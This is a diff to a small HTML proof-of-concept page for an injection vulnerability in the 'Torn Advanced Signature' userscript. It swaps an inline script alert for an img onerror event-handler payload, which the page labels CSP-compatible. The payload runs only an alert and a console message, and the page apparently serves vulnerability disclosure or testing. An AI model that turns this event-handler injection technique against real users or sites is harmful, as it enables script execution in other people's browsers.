@@ -2,15 +2,12 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC for Torn Advanced Signature Vulnerability</title>
+    <title>PoC for Torn Advanced Signature Vulnerability (CSP-Compatible)</title>
 </head>
 <body>
     <h1>Proof of Concept</h1>
-    <p>This is a demonstration of a security vulnerability in the Torn Advanced Signature userscript.</p>
-    <script>
-        // Harmless script to demonstrate code execution
-        alert("This is a proof of concept! The Torn Advanced Signature userscript allows arbitrary JavaScript execution, which is a security vulnerability.");
-        console.log("PoC executed: Arbitrary code execution successful.");
-    </script>
+    <p>This demonstrates a security vulnerability in the Torn Advanced Signature userscript.</p>
+    <!-- Use an event handler to trigger JavaScript execution -->
+    <img src="nonexistent.png" onerror="alert('PoC: HTML injection allows JavaScript execution via event handler. This is a vulnerability in the Torn Advanced Signature userscript.'); console.log('PoC executed: Event handler triggered.');">
 </body>
 </html>
